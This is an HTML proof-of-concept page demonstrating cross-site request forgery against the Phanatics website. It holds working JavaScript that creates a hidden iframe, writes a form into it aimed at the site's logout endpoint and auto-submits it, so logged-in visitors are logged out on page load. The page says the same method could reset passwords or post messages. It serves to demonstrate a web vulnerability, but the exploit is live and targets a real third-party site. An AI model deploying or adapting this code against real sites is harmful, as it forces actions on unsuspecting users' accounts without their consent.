<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script src="http://code.jquery.com/jquery-1.4.4.min.js"></script>
    <script>
$(document).ready(function() {
    $('body').append(
        $('<iframe style="display:none" id="iframe" name="iframe" src="about:blank" onload="iframe_load()">')
    );
});
function iframe_load() {
    var doc = $('#iframe').contents()[0];
    $(doc.body).html(
        '<form id="logform" name="logform" action="http://phanatics.nl/index.php?cat=log" method="post">' +
        '<input id="logOut" name="logOut" type="submit" value="log uit"></form>'
    );
    // TODO: There must be a way to remove the onload handler from the iframe
    $(doc).find('#logOut').click();
}
    </script>
    <title>CSRF test</title>
</head>

<body>

<h1>CSRF test</h1>

<p>
This page
uses <a href="http://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">CSRF</a>
to make a request to the <a href="http://phanatics.nl">Phanatics
    website</a> and trigger a logout action.

<p>
If you are currently logged in on the Phanatics website, you will be
logged out after visiting this page. Implementation is with Javascript
and a hidden IFrame.

<p>
Note that this is just a relatively harmless proof of concept. The
same technique can be used e.g. to reset your password, or to post a
forum message.

<p>
<a href="http://martijn.vermaat.name">Martijn Vermaat</a>

</body>

</html>
